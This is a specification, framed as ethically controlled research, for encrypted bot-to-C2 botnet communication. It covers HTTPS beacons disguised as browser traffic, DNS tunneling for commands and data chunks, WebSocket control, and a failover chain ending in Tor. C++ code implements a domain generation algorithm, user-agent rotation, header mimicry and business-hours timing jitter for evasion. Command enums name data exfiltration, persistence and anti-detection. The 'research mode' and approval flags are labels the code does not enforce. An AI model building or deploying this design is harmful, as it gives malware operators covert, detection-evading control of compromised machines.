# Communication Protocol Specification
## Encrypted Bot-to-C2 Communication Framework

**Version**: 1.0  
**Date**: January 2025  
**Purpose**: Educational research with ethical controls

---

## 🔐 Protocol Overview

The communication protocol implements **multi-layered security** with **research safety controls** and **traffic obfuscation** to enable realistic cybersecurity research while maintaining ethical boundaries.

### **Core Protocol Stack**
```
┌─────────────────────────────────────┐
│     Application Protocol            │  ← Bot Commands & Responses
├─────────────────────────────────────┤
│     Encryption Layer (AES-256-GCM)  │  ← End-to-end encryption
├─────────────────────────────────────┤
│     Authentication Layer (RSA)      │  ← Certificate-based auth
├─────────────────────────────────────┤
│     Obfuscation Layer               │  ← Traffic mimicking
├─────────────────────────────────────┤
│     Transport Layer (TLS 1.3)       │  ← Channel encryption
├─────────────────────────────────────┤
│     Network Layer (IP)              │  ← Standard networking
└─────────────────────────────────────┘
```

---

## 🌐 Communication Channels

### **Primary Channel: HTTPS/TLS**

#### **Endpoint Structure**
```
Primary:   https://c2-server.research.local:8443/api/v1/
Fallback:  https://backup-c2.research.local:8443/api/v1/
Research:  https://research-c2.university.edu:8443/api/v1/
```

#### **Request Format**
```http
POST /api/v1/bot/heartbeat HTTP/1.1
Host: c2-server.research.local:8443
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Type: application/json
X-Research-Session: research_session_12345
X-Bot-Version: 1.0.0
X-Timestamp: 1705123456789
X-Signature: <RSA_signature_of_payload>

{
  "bot_id": "bot_12345678-1234-1234-1234-123456789abc",
  "encrypted_payload": "<base64_encoded_encrypted_data>",
  "nonce": "<cryptographic_nonce>",
  "research_mode": true,
  "compliance_token": "<ethical_approval_token>"
}
```

#### **Response Format**
```http
HTTP/1.1 200 OK
Content-Type: application/json
X-Research-Session: research_session_12345
X-Command-Count: 3
X-Next-Checkin: 300
X-Emergency-Stop: false

{
  "status": "success",
  "encrypted_commands": "<base64_encoded_encrypted_commands>",
  "nonce": "<response_nonce>",
  "signature": "<RSA_signature_of_response>",
  "metadata": {
    "next_checkin_seconds": 300,
    "key_rotation_due": false,
    "research_session_active": true
  }
}
```

### **Fallback Channel: DNS Tunneling**

#### **DNS Query Encoding**
```
# Command request (Type: TXT)
cmd.<base32_encoded_command>.<subdomain>.research.local

# Data chunk transmission (Type: TXT)  
data.<chunk_id>.<base32_encoded_data>.<subdomain>.research.local

# Heartbeat (Type: A)
hb.<bot_id_hash>.<timestamp>.<subdomain>.research.local

# Research marker (Type: TXT)
research.<session_id>.<compliance_token>.<subdomain>.research.local
```

#### **DNS Response Encoding**
```
# TXT Record Command Response
"v=1;cmd=<base64_command>;sig=<signature>;next=300;research=true"

# A Record Status Response
# IP format: 192.168.<status_code>.<command_id>
# Status codes: 0=success, 1=error, 2=pending, 3=emergency_stop
192.168.0.123  # Success for command 123

# CNAME Record for redirection
redirect.backup-c2.research.local
```

### **Real-time Channel: WebSocket**

#### **Connection Establishment**
```javascript
// WebSocket connection with research headers
const ws = new WebSocket('wss://c2-server.research.local:8443/ws', {
  headers: {
    'X-Research-Session': 'research_session_12345',
    'X-Bot-ID': 'bot_12345678-1234-1234-1234-123456789abc',
    'X-Compliance-Token': 'ethical_approval_token'
  }
});
```

#### **WebSocket Message Format**
```json
{
  "type": "command|response|heartbeat|emergency|research_log",
  "timestamp": "2025-01-25T15:30:00Z",
  "message_id": "msg_12345",
  "encrypted_payload": "<base64_encrypted_data>",
  "signature": "<RSA_signature>",
  "research_metadata": {
    "session_id": "research_session_12345",
    "researcher_id": "researcher_001",
    "approved": true,
    "log_level": "INFO"
  }
}
```

---

## 🔑 Encryption and Authentication

### **Key Management System**

#### **Initial Key Exchange**
```cpp
// Bot generates RSA-4096 key pair
class KeyExchange {
public:
    struct InitialHandshake {
        std::string bot_public_key;     // RSA-4096 public key
        std::string system_fingerprint; // Unique system ID
        std::string research_token;     // Ethical approval token
        uint64_t timestamp;
        std::string signature;          // Self-signed with private key
    };
    
    struct C2Response {
        std::string signed_certificate; // C2-signed bot certificate
        std::string session_key;        // AES-256 session key
        std::string next_rotation;      // Next key rotation time
        bool research_approved;         // Ethical approval status
    };
};
```

#### **Session Key Rotation**
```cpp
class SessionKeyManager {
private:
    std::string current_session_key_;
    std::string next_session_key_;
    std::chrono::steady_clock::time_point rotation_time_;
    
public:
    // Automatic key rotation every 24 hours (configurable)
    bool RotateKeys();
    std::string GetCurrentKey();
    bool ValidateIncomingKey(const std::string& key);
    
    // Research mode: shorter rotation for analysis
    void SetResearchRotationInterval(std::chrono::hours interval);
};
```

### **Encryption Implementation**

#### **AES-256-GCM Encryption**
```cpp
class EncryptionHandler {
public:
    struct EncryptedData {
        std::vector<uint8_t> ciphertext;
        std::vector<uint8_t> nonce;        // 96-bit nonce
        std::vector<uint8_t> auth_tag;     // 128-bit authentication tag
        std::string key_id;                // Key identifier
    };
    
    EncryptedData Encrypt(const std::string& plaintext, 
                         const std::string& session_key);
    std::string Decrypt(const EncryptedData& encrypted_data,
                       const std::string& session_key);
    
    // Research mode: optional plaintext logging
    void SetResearchMode(bool enabled);
    void LogEncryptionActivity(const std::string& activity);
};
```

#### **Digital Signatures**
```cpp
class SignatureHandler {
public:
    // RSA-PSS with SHA-256
    std::string SignMessage(const std::string& message,
                           const RSAPrivateKey& private_key);
    bool VerifySignature(const std::string& message,
                        const std::string& signature,
                        const RSAPublicKey& public_key);
    
    // Certificate validation
    bool ValidateCertificateChain(const X509Certificate& cert);
    bool IsCertificateRevoked(const std::string& serial_number);
};
```

---

## 📡 Command Protocol

### **Command Structure**

#### **Base Command Format**
```cpp
struct Command {
    std::string command_id;          // Unique command identifier
    std::string command_type;        // Type of command
    nlohmann::json parameters;       // Command parameters
    uint32_t priority;               // Execution priority (1-5)
    std::chrono::steady_clock::time_point expiry; // Command expiry
    bool requires_response;          // Response requirement
    bool research_approved;          // Ethical approval flag
    std::string approval_token;      // Research approval token
};
```

#### **Command Types**

**System Commands**
```cpp
enum class SystemCommand {
    HEARTBEAT,           // Regular check-in
    UPDATE_CONFIG,       // Configuration update
    ROTATE_KEYS,         // Key rotation
    EMERGENCY_STOP,      // Emergency shutdown
    RESEARCH_LOG_DUMP,   // Research data collection
    COMPLIANCE_CHECK     // Ethical compliance verification
};
```

**Research Commands**
```cpp
enum class ResearchCommand {
    COLLECT_SYSTEM_INFO,     // System information gathering
    NETWORK_DISCOVERY,       // Network topology discovery
    PROCESS_ENUMERATION,     // Running process analysis
    FILE_SYSTEM_SCAN,        // File system structure
    SECURITY_ANALYSIS,       // Security tool detection
    PERFORMANCE_MONITOR      // System performance metrics
};
```

**Controlled Attack Commands** (Research Mode Only)
```cpp
enum class AttackCommand {
    SIMULATE_DDOS,           // DDoS simulation (no real traffic)
    MOCK_DATA_EXFILTRATION,  // Simulated data theft
    TEST_PERSISTENCE,        // Persistence mechanism testing
    STEALTH_EVALUATION,      // Stealth capability assessment
    EVASION_TESTING         // Anti-detection testing
};
```

### **Command Execution Flow**

```cpp
class CommandProcessor {
public:
    enum class ExecutionResult {
        SUCCESS,
        FAILED,
        BLOCKED_BY_ETHICS,
        REQUIRES_APPROVAL,
        EXPIRED,
        INVALID_SIGNATURE
    };
    
    ExecutionResult ProcessCommand(const Command& cmd) {
        // 1. Validate command signature
        if (!ValidateSignature(cmd)) {
            return ExecutionResult::INVALID_SIGNATURE;
        }
        
        // 2. Check ethical constraints
        if (!ethical_controller_->ValidateCommand(cmd)) {
            LogEthicalViolation(cmd);
            return ExecutionResult::BLOCKED_BY_ETHICS;
        }
        
        // 3. Check research approval
        if (!research_mode_ && cmd.research_approved) {
            return ExecutionResult::REQUIRES_APPROVAL;
        }
        
        // 4. Check expiry
        if (IsCommandExpired(cmd)) {
            return ExecutionResult::EXPIRED;
        }
        
        // 5. Execute command
        return ExecuteCommandSafely(cmd);
    }
};
```

---

## 🛡️ Traffic Obfuscation

### **HTTP Traffic Mimicking**

#### **User Agent Rotation**
```cpp
class UserAgentRotator {
private:
    std::vector<std::string> user_agents_ = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    };
    
public:
    std::string GetRandomUserAgent();
    void UpdateUserAgentList(const std::vector<std::string>& new_agents);
    
    // Research mode: mark traffic clearly
    std::string GetResearchUserAgent() {
        return "Research-Bot/1.0 (Educational-Purpose; Contact: research@university.edu)";
    }
};
```

#### **HTTP Header Mimicking**
```cpp
class HTTPHeaderObfuscator {
public:
    std::map<std::string, std::string> GenerateNormalHeaders() {
        return {
            {"Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
            {"Accept-Language", "en-US,en;q=0.5"},
            {"Accept-Encoding", "gzip, deflate"},
            {"DNT", "1"},
            {"Connection", "keep-alive"},
            {"Upgrade-Insecure-Requests", "1"}
        };
    }
    
    std::map<std::string, std::string> GenerateResearchHeaders() {
        auto headers = GenerateNormalHeaders();
        headers["X-Research-Purpose"] = "Educational-Cybersecurity-Research";
        headers["X-Ethical-Approval"] = "IRB-2025-001";
        headers["X-Contact"] = "security-research@university.edu";
        return headers;
    }
};
```

### **Domain Generation Algorithm**

#### **DGA Implementation**
```cpp
class DomainGenerator {
public:
    struct DGAConfig {
        uint32_t seed;
        std::vector<std::string> tlds;
        uint32_t domains_per_day;
        std::string prefix;
        bool research_mode;
    };
    
    std::vector<std::string> GenerateDomains(uint32_t date_seed, 
                                            const DGAConfig& config) {
        std::vector<std::string> domains;
        
        for (uint32_t i = 0; i < config.domains_per_day; ++i) {
            uint32_t combined_seed = date_seed ^ config.seed ^ i;
            std::string domain = GenerateDomainName(combined_seed, config);
            
            if (config.research_mode) {
                domain = "research-" + domain;
            }
            
            domains.push_back(domain);
        }
        
        return domains;
    }
    
private:
    std::string GenerateDomainName(uint32_t seed, const DGAConfig& config);
};
```

### **Traffic Timing Obfuscation**

#### **Jitter and Randomization**
```cpp
class TimingObfuscator {
public:
    // Add random jitter to check-in intervals
    std::chrono::seconds AddJitter(std::chrono::seconds base_interval) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(-30, 30); // ±30 seconds jitter
        
        auto jitter = std::chrono::seconds(dis(gen));
        return base_interval + jitter;
    }
    
    // Simulate human-like activity patterns
    std::chrono::seconds GetNextCheckinInterval() {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        auto local_tm = *std::localtime(&time_t);
        
        // More frequent during business hours, less at night
        if (local_tm.tm_hour >= 9 && local_tm.tm_hour <= 17) {
            return std::chrono::minutes(5);  // Business hours
        } else {
            return std::chrono::minutes(15); // Off hours
        }
    }
    
    // Research mode: predictable timing for analysis
    std::chrono::seconds GetResearchInterval() {
        return std::chrono::minutes(2); // Consistent 2-minute intervals
    }
};
```

---

## 🔬 Research and Compliance

### **Research Session Management**

#### **Session Initialization**
```cpp
struct ResearchSession {
    std::string session_id;
    std::string researcher_id;
    std::string institutional_approval;
    std::chrono::steady_clock::time_point start_time;
    std::chrono::steady_clock::time_point end_time;
    std::vector<std::string> approved_commands;
    GeographicRestrictions geo_limits;
    EthicalConstraints ethical_limits;
};

class ResearchSessionManager {
public:
    bool InitializeSession(const ResearchSession& session);
    bool ValidateSessionActive(const std::string& session_id);
    bool IsCommandApproved(const std::string& session_id, 
                          const std::string& command_type);
    void LogResearchActivity(const std::string& session_id,
                           const std::string& activity);
    void TerminateSession(const std::string& session_id);
};
```

#### **Compliance Monitoring**
```cpp
class ComplianceMonitor {
public:
    struct ComplianceViolation {
        std::string violation_type;
        std::string description;
        std::chrono::steady_clock::time_point timestamp;
        std::string bot_id;
        std::string research_session;
        ViolationSeverity severity;
    };
    
    bool CheckGeographicCompliance(const std::string& bot_location);
    bool CheckTimeRestrictions(const std::string& session_id);
    bool CheckCommandLimits(const std::string& session_id);
    
    void ReportViolation(const ComplianceViolation& violation);
    void TriggerEmergencyStop(const std::string& reason);
};
```

### **Research Data Collection**

#### **Communication Logging**
```cpp
class ResearchLogger {
public:
    struct CommEvent {
        std::string event_id;
        std::string bot_id;
        std::string research_session;
        std::chrono::steady_clock::time_point timestamp;
        std::string channel;        // HTTPS, DNS, WebSocket
        std::string direction;      // inbound, outbound
        size_t payload_size;
        std::string command_type;
        bool encrypted;
        std::string research_notes;
    };
    
    void LogCommunication(const CommEvent& event);
    void LogCommand(const std::string& bot_id, const Command& cmd);
    void LogResponse(const std::string& bot_id, const CommandResponse& resp);
    
    // Export research data
    std::string ExportSessionData(const std::string& session_id);
    void ArchiveSessionData(const std::string& session_id);
};
```

---

## ⚡ Performance and Reliability

### **Connection Resilience**

#### **Automatic Failover**
```cpp
class ConnectionManager {
private:
    std::vector<Endpoint> c2_endpoints_;
    size_t current_endpoint_index_;
    std::chrono::steady_clock::time_point last_successful_contact_;
    
public:
    bool TryConnect();
    bool TryNextEndpoint();
    void UpdateEndpointList(const std::vector<Endpoint>& new_endpoints);
    bool IsConnectionHealthy();
    
    // Fallback chain: HTTPS -> DNS -> WebSocket -> Tor (if available)
    bool AttemptFallbackChain();
};
```

#### **Bandwidth Adaptation**
```cpp
class BandwidthManager {
public:
    // Adapt communication frequency based on available bandwidth
    void AdaptToNetworkConditions();
    std::chrono::seconds GetOptimalCheckinInterval();
    size_t GetMaxPayloadSize();
    
    // Research mode: consistent behavior for analysis
    void SetResearchMode(bool enabled);
};
```

### **Error Handling and Recovery**

#### **Communication Error Handling**
```cpp
class ErrorHandler {
public:
    enum class ErrorType {
        NETWORK_UNREACHABLE,
        AUTHENTICATION_FAILED,
        ENCRYPTION_ERROR,
        PROTOCOL_ERROR,
        RESEARCH_VIOLATION,
        EMERGENCY_STOP_TRIGGERED
    };
    
    void HandleError(ErrorType error, const std::string& details);
    bool ShouldRetryOperation(ErrorType error);
    std::chrono::seconds GetRetryDelay(ErrorType error);
    
    // Research mode: detailed error logging
    void LogResearchError(ErrorType error, const std::string& context);
};
```

---

This communication protocol specification provides a **comprehensive framework** for secure, obfuscated, and ethically-controlled bot-to-C2 communication, enabling realistic cybersecurity research while maintaining safety boundaries and compliance requirements.
